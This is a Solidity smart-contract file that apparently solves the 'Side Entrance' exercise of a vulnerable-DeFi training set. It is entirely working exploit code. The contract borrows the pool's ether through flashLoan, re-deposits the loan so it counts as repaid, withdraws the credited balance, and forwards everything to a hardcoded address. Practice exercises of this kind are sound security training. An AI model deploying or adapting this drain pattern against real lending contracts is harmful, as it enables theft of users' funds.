// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackerContract is SideEntranceLenderPool {
    using Address for address payable;
    address _target;

    constructor(address target) {
        _target = target;
    }

    function attack(uint256 amount) public payable {
        //SideEntranceLenderPool(_target).withdraw();
        SideEntranceLenderPool(_target).flashLoan(amount);
    }

    function execute() external payable {

        bytes memory data = abi.encodeWithSignature("deposit()");
        (bool ok, ) = _target.call{value: msg.value}(data);
        require(ok, "Failed to call deposit");
    }

    function requestWithdraw() external {
        SideEntranceLenderPool(_target).withdraw();
    }

    receive() external payable {
        payable(0x70997970C51812dc3A010C7d01b50e0d17dc79C8).sendValue(
            address(this).balance
        );
    }
}
